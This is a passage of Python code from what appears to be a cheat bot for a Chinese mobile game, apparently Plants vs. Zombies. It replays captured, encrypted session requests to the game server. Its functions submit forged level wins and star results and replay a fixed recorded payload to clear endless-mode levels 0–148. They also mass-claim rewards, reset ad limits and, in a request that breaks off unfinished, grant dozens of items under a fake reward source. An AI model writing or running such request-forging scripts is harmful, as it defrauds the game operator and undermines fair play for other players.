        gg_list = [index for index, item in enumerate(target_world['bossInfo']) if item.get('t') != [1, 1, 1] and item.get('ss') != 0]
        current_star = target_world['sc']
        max_star = target_world['sm']
        if current_star == max_star:
            print(f"已满星")
            jl_list = [index for index, item in enumerate(target_world['rewardList']) if item.get('ss') == 0]
            for i in jl_list:
                data = {"req": "V413", "e": {"index": i, "pi": pi, "sk": sk, "ui": ui, "world": remaining_name}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("困难星级奖励成功")
                else:
                    print("困难星级奖励失败")
        else:
            print(f"当前星级：未满星")
        for i in ez_list:
            data = {"req": "V411", "e": {"level": i, "pi": pi, "sk":sk, "tgt": "", "type": "0", "ui": ui, "win": "1", "world": remaining_name}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("简单模式成功")
            else:
                print("简单模式失败")
        for i in js_list:
            data = {"req":"V412","e":{"level":i,"pi":pi,"sk":sk,"ui":ui,"world":remaining_name},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("困难模式解锁成功")
            elif response_data.get("r") == 21705:
                print("钥匙不足")
                break
            else:
                print("困难模式解锁失败")
                break
        for i in gg_list:
            data = {"req": "V411", "e": {"level": i, "pi": pi, "sk": sk, "tgt": "1,1,1", "type": "1", "ui": ui, "win": "1", "world": remaining_name}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("困难成功")
            else:
                print("困难失败")
def run_eleventh_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10849, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        data_dict = json.loads(decrypted_json['e']['d'][0]['data'])
        excluded_names = {"uncharted_tale_2"}
        remaining_name = next((world["name"] for world in data_dict["world"] if world["name"] in excluded_names),None)
        target_world = next((world for world in data_dict['world'] if world['name'] in excluded_names),None)
        ez_list = [idx for idx, item in enumerate(target_world['generalInfo']) if item.get('ss') != 2]
        js_list = [idx for idx, item in enumerate(target_world['bossInfo']) if item.get('ss') == 0]
        gg_list = [index for index, item in enumerate(target_world['bossInfo']) if item.get('t') != [1, 1, 1] and item.get('ss') != 0]
        current_star = target_world['sc']
        max_star = target_world['sm']
        if current_star == max_star:
            print(f"已满星")
            jl_list = [index for index, item in enumerate(target_world['rewardList']) if item.get('ss') == 0]
            for i in jl_list:
                data = {"req": "V413", "e": {"index": i, "pi": pi, "sk": sk, "ui": ui, "world": remaining_name}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("困难星级奖励成功")
                else:
                    print("困难星级奖励失败")
        else:
            print(f"当前星级：未满星")
        for i in ez_list:
            data = {"req": "V411", "e": {"level": i, "pi": pi, "sk":sk, "tgt": "", "type": "0", "ui": ui, "win": "1", "world": remaining_name}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("简单模式成功")
            else:
                print("简单模式失败")
                break
        for i in js_list:
            data = {"req":"V412","e":{"level":i,"pi":pi,"sk":sk,"ui":ui,"world":remaining_name},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("困难模式解锁成功")
            elif response_data.get("r") == 21705:
                print("钥匙不足")
                break
            else:
                print("困难模式解锁失败")
                break
        for i in gg_list:
            data = {"req": "V411", "e": {"level": i, "pi": pi, "sk": sk, "tgt": "1,1,1", "type": "1", "ui": ui, "win": "1", "world": remaining_name}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("困难成功")
            else:
                print("困难失败")
def run_twelfth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10861, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0","pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    inner_data = json.loads(decrypted_json["e"]["d"][0]["data"])
    week_task_list = inner_data["week_task_list"]
    one_list = []
    two_list = []
    three_list = []
    four_list = []
    if len(week_task_list) >= 1:
        for key, val in week_task_list[0].items():
            if val == 0:
                one_list.append(key)
    if len(week_task_list) >= 2:
        for key, val in week_task_list[1].items():
            if val == 0:
                two_list.append(key)
    if len(week_task_list) >= 3:
        for key, val in week_task_list[2].items():
            if val == 0:
                three_list.append(key)
    if len(week_task_list) >= 4:
        for key, val in week_task_list[3].items():
            if val == 0:
                four_list.append(key)
    list_wi_map = [
        (one_list, 1),
        (two_list, 2),
        (three_list, 3),
        (four_list, 4)
    ]
    for current_list, wi in list_wi_map:
        for ti_str in current_list:
            ti = int(ti_str)
            data = {"req": "V857", "e": {"pi": pi, "sk": sk, "ti": ti, "type": "1", "ui": ui, "wi": wi}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            r_value = decrypted_json.get('r', None)
            if r_value != 0:
                print("领取失败")
            else:
                print("领取成功")
                gifts = decrypted_json['e']['d'].get('bl', [])
                for gift in gifts:
                    i_value = str(gift.get('i', ""))
                    q_value = gift.get('q', 0)
                    plant_info = formatted_plant.get(
                        i_value,
                        {"name": f"未知物品({i_value})", "pinzhi": "default"}
                    )
                    plant_name = plant_info["name"]
                    plant_pinzhi = plant_info["pinzhi"]
                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                    print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR}")
                    print(f"获得的数量为: {q_value}")
                time.sleep(0)
    data ={"req": "V1100", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("双人奖励领取成功")
    else:
        print("双人奖励领取失败")
    time.sleep(0)
def run_thirteenth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V303","e":{"al":[{"id":10613,"abi":0,"type":1,"config_version":1},{"id":10799,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("僵博刷新成功")
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        op_value = decrypted_json["e"]["d"][0].get("op")
        if op_value == 0 or op_value == None:
            print("活动未开启")
        elif op_value == 1:
            for i in range(12):
                data ={"req": "V273", "e": {"bi": "0", "d": [{"id": 0, "t": 132.715591, "l": 0.0, "k": 1}], "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("僵博挑战成功")
                else:
                    print("僵博挑战失败")
                time.sleep(0)
            for i in range(100):
                data = {"req":"V347","e":{"lct":"1","pi":pi,"sk":sk,"t":"10799","ui":ui},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("奖励抽取成功")
                else:
                    print("奖励抽取失败")
                    break
                time.sleep(0)
    else:
            print("僵博刷新失败")
def run_fourteenth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10622, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    data = {"req":"V222","e":{"p":{"of":99},"pi":pi,"rv":"5","sk":sk,"t":"12","ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    ell_dict = json.loads(decrypted_json['e']['d']['j'])['ell'][0]['s']
    if int(ell_dict) != 417500:
        print("无尽榜单暂未固定")
        return
    else:
        sub_str = decrypted_json['e']['d']['j']
        try:
            sub_dict = json.loads(sub_str)
            value_of_l = sub_dict.get('l')
        except json.JSONDecodeError:
            print("解析JSON字符串出错")
        data = {"req": "V318", "e": {"acd": {"g": 0}, "l": value_of_l, "pi": pi, "pl": [], "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        failure_count = 0
        i = int(value_of_l)
        i_value = int(value_of_l)
        while i <= 148:
            if i <= 63:
                data ={"req": "V322", "e": {"acd": {"g": 3317, "ubn": 0, "uebn": 0, "upnl": [{"id": 111019, "n": 2}]}, "fr": "1", "pi": pi, "pr": {"pl": [{"i": 111019, "q": 4}, {"i": 111022, "q": 4}, {"i": 1012, "q": 5}, {"i": 1031, "q": 5}, {"i": 200034, "q": 4}, {"i": 200070, "q": 5}]}, "ri": {"l": i, "ml": 0, "lwml": 149, "lc": [1, 1, 1, 1, 1], "eb": 1, "eub": 0, "pl": "H4sIAAAAAAAAA31VYUvDMBT8Q_vQtVPxY1grZuyllGXM-U2HjqYOhSFp8-vtkgqCd_tWUnLv7r27l11xbl92TVs77aVUhQy-fW31rRTZ-W1YfT0vx29b9VI22Xq5-tbuM7xv-jt9-ujG72G8401ozvq0GDHM_frxF2-8Y1VmNghP9dLSOjmoczkP8NxW3pQHVN8be6S86iXklRuu_wbz6gral3IL6sc-94LqOzX-O_RMp7iK6oH9jHgyZ_zECcMrDOW3x3O4xtt2U52H_3WQP2KdLeddatbXnPdhi_hNc0L-jXgD9EnEU5SfcdCPUW_N9SJ_Jb2Bzj3AvEY8zflZPneh_A4Dm29dIn6xf3NDc955rhf1L-J5iJd8SfeTBKQ34mUcTyO9Cc_SXA9wvlHvccFzSPs3XMkh3kdxT_B84H184SdUr-H8Mrgvk5_RXkz72imul-eX-s_weRR8z-7ROzPNt-N-pniC_DfxQ3qra7nOYQ6Tj1CuU52A5j7lmr13NO-K7qP6z7v61MxmP3cs_ItECAAA", "dm": "1224a334299aa9b2bf15c5cbfa7b11de", "ls": 2050, "ds": 0, "bn": 1, "bu": 0, "m": 25545, "jc": 0, "jl": 0, "par": 58, "pas": 500, "on": "53fc6d2faea34c2681abbcf018d344f7", "alt": 15, "amt": 15, "cil": []}, "sk": sk, "ui": ui, "w": "4"}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print(f"过关成功，当前关卡为{i}")
                else:
                    print("失败")
                i += 1
            else:
                time.sleep(15)
                data ={"req": "V322", "e": {"acd": {"g": 3317, "ubn": 0, "uebn": 0, "upnl": [{"id": 111019, "n": 2}]}, "fr": "1", "pi": pi, "pr": {"pl": [{"i": 111019, "q": 4}, {"i": 111022, "q": 4}, {"i": 1012, "q": 5}, {"i": 1031, "q": 5}, {"i": 200034, "q": 4}, {"i": 200070, "q": 5}]}, "ri": {"l": i, "ml": 0, "lwml": 149, "lc": [1, 1, 1, 1, 1], "eb": 1, "eub": 0, "pl": "H4sIAAAAAAAAA31VYUvDMBT8Q_vQtVPxY1grZuyllGXM-U2HjqYOhSFp8-vtkgqCd_tWUnLv7r27l11xbl92TVs77aVUhQy-fW31rRTZ-W1YfT0vx29b9VI22Xq5-tbuM7xv-jt9-ujG72G8401ozvq0GDHM_frxF2-8Y1VmNghP9dLSOjmoczkP8NxW3pQHVN8be6S86iXklRuu_wbz6gral3IL6sc-94LqOzX-O_RMp7iK6oH9jHgyZ_zECcMrDOW3x3O4xtt2U52H_3WQP2KdLeddatbXnPdhi_hNc0L-jXgD9EnEU5SfcdCPUW_N9SJ_Jb2Bzj3AvEY8zflZPneh_A4Dm29dIn6xf3NDc955rhf1L-J5iJd8SfeTBKQ34mUcTyO9Cc_SXA9wvlHvccFzSPs3XMkh3kdxT_B84H184SdUr-H8Mrgvk5_RXkz72imul-eX-s_weRR8z-7ROzPNt-N-pniC_DfxQ3qra7nOYQ6Tj1CuU52A5j7lmr13NO-K7qP6z7v61MxmP3cs_ItECAAA", "dm": "1224a334299aa9b2bf15c5cbfa7b11de", "ls": 2050, "ds": 0, "bn": 1, "bu": 0, "m": 25545, "jc": 0, "jl": 0, "par": 58, "pas": 500, "on": "53fc6d2faea34c2681abbcf018d344f7", "alt": 15, "amt": 15, "cil": []}, "sk": sk, "ui": ui, "w": "4"}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print(f"过关成功，当前关卡为{i}，等待15秒")
                else:
                    print("失败")
                i += 1
def run_fifteenth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V921", "e": {"oi": "10308", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("广告重置成功")
    elif response_data.get("r") == 10201:
        print("广告重置次数不足")
        data = {"req":"V319","e":{"g":"21549","l":"0","pi": pi,"sk": sk,"t":"0","ui": ui},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("免费重置成功")
        elif response_data.get("r") == 10201:
            print("免费重置次数不足")
        elif response_data.get("r") == 40023:
            print("免费重置不在时间范围内")
        else:
            print("免费重置失败")
    else:
        print("广告重置失败")
def run_sixteenth_script():
    pi, ui, sk = get_pi_sk(加密)
    data ={"req":"V303","e":{"al":[{"id":10835,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("戴夫厨房状态更新成功")
    else:
        print("戴夫厨房状态更新失败")
    pi, ui, sk = get_pi_sk(加密)
    data ={"req":"V303","e":{"al":[{"id":10878,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("戴夫厨房状态更新成功")
    else:
        print("戴夫厨房状态更新失败")
    for i in range(2):
        pi, ui, sk = get_pi_sk(加密)
        data ={"req":"V712","e":{"key":1+i+1,"pi":pi,"sk":sk,"ui":ui},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("水领取成功")
        else:
            print("水领取失败")
    for i in range(6):
        pi, ui, sk = get_pi_sk(加密)
        data = {"req":"V711","e":{"key":"6","pi":pi,"sk":sk,"ui":ui},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("钻石领取成功")
        else:
            print("领取失败")
def run_seventeen_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V303","e":{"al":[{"id":10863,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("聚宝盆刷新成功")
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        op_value = decrypted_json["e"]["d"][0].get("op")
        if op_value == 0 or op_value == None:
            print("活动未开启")
        elif op_value == 1:
            inner_data = json.loads(decrypted_json["e"]["d"][0]["data"])
            task = inner_data["task"]
            keys_list = list(task.keys())
            specific_keys = keys_list[:5]
            extracted_numbers = [int(key) for key in specific_keys]
            for ti in extracted_numbers:
                data = {"req":"V868","e":{"pi":pi,"sk":sk,"ti":ti,"ui":ui},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 0:
                    print("聚宝盆任务领取成功")
                else:
                    print("聚宝盆任务领取失败")
            data = {"req":"V869","e":{"index":"3","pi":pi,"sk":sk,"t":"0","ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 0:
                print("代币领取成功")
            else:
                print("代币领取失败")
    else:
        print("聚宝盆刷新失败")
def run_eighteenth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V303","e":{"al":[{"id":10851,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("令营刷新成功")
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        op_value = decrypted_json["e"]["d"][0].get("op")
        if op_value == 0 or op_value == None:
            print("活动未开启")
        elif op_value == 1:
            inner_data = json.loads(decrypted_json["e"]["d"][0]["data"])
            task_values = inner_data.get('task_list', [])
            ri_list = []
            zhou_list = []
            xianding_list = []
            for i, task_dict in enumerate(task_values):
                for key, value in task_dict.items():
                    if value != 1:
                        if i == 0:
                            ri_list.append(key)
                        elif i == 1:
                            zhou_list.append(key)
                        elif i == 2:
                            xianding_list.append(key)
            for ti in ri_list:
                data = {"req":"V432","e":{"pi":pi,"sk":sk,"ti":ti,"type":"0","ui":ui},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("令营日任务领取成功")
                else:
                    print("令营日任务领取失败")
            for ti in zhou_list:
                data = {"req":"V432","e":{"pi":pi,"sk":sk,"ti":ti,"type":"1","ui":ui},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("令营周任务领取成功")
                else:
                    print("令营周任务领取失败")
            for ti in xianding_list:
                data = {"req":"V432","e":{"pi":pi,"sk":sk,"ti":ti,"type":"2","ui":ui},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("令营限定任务领取成功")
                else:
                    print("令营限定任务领取失败")
            data = {"req": "V1105", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("令营奖励领取成功")
            else:
                print("令营奖励领取失败")
    else:
        print("令营刷新失败")
def run_nineteenth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V316","e":{"b":"0","n":"","pi":pi,"sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    fg_values = decrypted_json['e']['d']['p']['fg']
    uk_values = decrypted_json['e']['d']['p']['uk']
    il_list = decrypted_json['e']['d'].get('il', [])
    pcl_list = decrypted_json['e']['d'].get('pcl', [])
    dcl_list = decrypted_json['e']['d'].get('dcl', [])
    ndcl_list = decrypted_json['e']['d'].get('ndcl', [])
    pl_list = decrypted_json['e']['d'].get('pl', [])
    for item in pl_list:
        i_value = item['i']
        s_value = item['s']
        found = False
        jieshu_value = None
        for plant_dict in plant_list:
            plant_id = next(iter(plant_dict))
            if int(plant_id) == int(i_value):
                found = True
                jieshu_value = plant_dict.get('jieshu')
                break
        if found:
            s_int = int(s_value)
            jieshu_int = int(jieshu_value)
            if s_int > jieshu_int:
                item['s'] = jieshu_value
            else:
                pass
        else:
            print(f"植物编号 {i_value} 在 p_list 中未找到，跳过")
    dl_list = decrypted_json['e']['d'].get('dl', [])
    ndl_list = decrypted_json['e']['d'].get('ndl', [])
    al_list = decrypted_json['e']['d'].get('al', [])
    gene_list = decrypted_json['e']['d'].get('gene', [])
    while True:
        print(f""" \033[96m钻石\033[0m {fg_values}    UK值{uk_values}""")
        user_input = input(f"""

 1. 背包道具
 2. 植物碎片
 3. 伴生装扮碎片
 4. 装扮碎片
 5. 植物阶数
 6. 已拥有伴生装扮
 7. 已拥有装扮
 8. 神器列表
 9. 基因等级
10. 双人僵尸等级

请输入选项: """).strip()
        if user_input == "":
            print("退出查询。")
            break
        elif user_input == "10":
            data = {"req": "V303", "e": {"al": [{"id": 10859, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            op_value = decrypted_json["e"]["d"][0].get("op")
            if op_value == 0 or op_value == None:
                print("活动未开启")
            elif op_value == 1:
                zb_lt = json.loads(decrypted_json["e"]["d"][0]["data"])
                zbl_list = zb_lt.get('zombiesData')
                list_data = zbl_list['list']
                chip_data = zbl_list['chip']
                list_lv_map = {int(item['i']) + 4000: item['lv'] for item in list_data}
                for chip in chip_data:
                    chip_id = chip['i']
                    if chip_id in list_lv_map:
                        level = list_lv_map[chip_id]
                        i_value = str(chip.get('i', ""))
                        q_value = chip.get('q', 0)
                        plant_info = formatted_plant.get(
                            i_value,
                            {"name": f"未知物品({i_value})", "pinzhi": "default"}
                        )
                        plant_name = plant_info["name"]
                        plant_pinzhi = plant_info["pinzhi"]
                        color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                        print(f"\n {color_code}{plant_name}{RESET_COLOR} lv:{level} x{q_value}")
        else:
            query_items(user_input,il_list=il_list, pcl_list=pcl_list, dcl_list=dcl_list, ndcl_list=ndcl_list,pl_list=pl_list, dl_list=dl_list, ndl_list=ndl_list, al_list=al_list, gene_list=gene_list,formatted_plant=formatted_plant, pinzhi_to_color=pinzhi_to_color, RESET_COLOR=RESET_COLOR)
def run_twenty_first_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V316", "e": {"b": "0", "n": "", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    uk_value = decrypted_json['e']['d']['p']['uk']
    uk_value = int(uk_value)
    uki = uk_value + 1
    shijie = "tutorial10_hard_level_reward"
    data ={"req": "V302", "e": {"nfc": "1", "o": [{"i": "1201", "q": 1, "f": shijie}, {"i": "1202", "q": 1, "f": shijie}, {"i": "1203", "q": 1, "f": shijie}, {"i": "1204", "q": 1, "f": shijie}, {"i": "1205", "q": 1, "f": shijie}, {"i": "1206", "q": 1, "f": shijie}, {"i": "1207", "q": 1, "f": shijie}, {"i": "1208", "q": 1, "f": shijie}, {"i": "1209", "q": 1, "f": shijie}, {"i": "1210", "q": 1, "f": shijie}, {"i": "1211", "q": 1, "f": shijie}, {"i": "1212", "q": 1, "f": shijie}, {"i": "1213", "q": 1, "f": shijie}, {"i": "1214", "q": 1, "f": shijie}, {"i": "1215", "q": 1, "f": shijie}, {"i": "1216", "q": 1, "f": shijie}, {"i": "1217", "q": 1, "f": shijie}, {"i": "1218", "q": 1, "f": shijie}, {"i": "1219", "q": 1, "f": shijie}, {"i": "1220", "q": 1, "f": shijie}, {"i": "1221", "q": 1, "f": shijie}, {"i": "1222", "q": 1, "f": shijie}, {"i": "1223", "q": 1, "f": shijie}, {"i": "1224", "q": 1, "f": shijie}, {"i": "1225", "q": 1, "f": shijie}, {"i": "1226", "q": 1, "f": shijie}, {"i": "1227", "q": 1, "f": shijie}, {"i": "1228", "q": 1, "f": shijie}, {"i": "1229", "q": 1, "f": shijie}, {"i": "1230", "q": 1, "f": shijie}, {"i": "1231", "q": 1, "f": shijie}, {"i": "1232", "q": 1, "f": shijie}, {"i": "1233", "q": 1, "f": shijie}, {"i": "1234", "q": 1, "f": shijie}, {"i": "1235", "q": 1, "f": shijie}, {"i": "1236", "q": 1, "f": shijie}, {"i": "1237", "q": 1, "f": shijie}, {"i": "1239", "q": 1, "f": shijie}, {"i": "1240", "q": 1, "f": shijie}, {"i": "1241", "q": 1, "f": shijie}, {"i": "1242", "q": 1, "f": shijie}, {"i": "1243", "q": 1, "f": shijie}, {"i": "1244", "q": 1, "f": shijie}, {"i": "1245", "q": 1, "f": shijie}, {"i": "1247", "q": 1, "f": shijie}, {"i": "1249", "q": 1, "f": shijie}, {"i": "1250", "q": 1, "f": shijie}, {"i": "1251", "q": 1, "f": shijie}, {"i": "1252", "q": 1, "f": shijie}, {"i": "1253", "q": 1, "f": shijie}, {"i": "1254", "q": 1, "f": shijie}, {"i": "1255", "q": 1, "f": shijie}, {"i": "1256", "q": 1, "f": shijie}, {"i": "1257", "q": 1, "f": shijie}, {"i": "1258", "q": 1, "f": shijie}, {"i": "1259", "q": 1, "f": shijie}, {"i": "1260", "q": 1, "f": shijie}, {"i": "1261", "q": 1, "f": shijie}, {"i": "1262", "q": 1, "f": shijie}, {"i": "1263", "q": 1, "f": shijie}, {"i": "1264", "q": 1, "f": shijie}, {"i": "1265", "q": 1, "f": shijie}, {"i": "1266", "q": 1, "f": shijie}, {"i": "1267", "q": 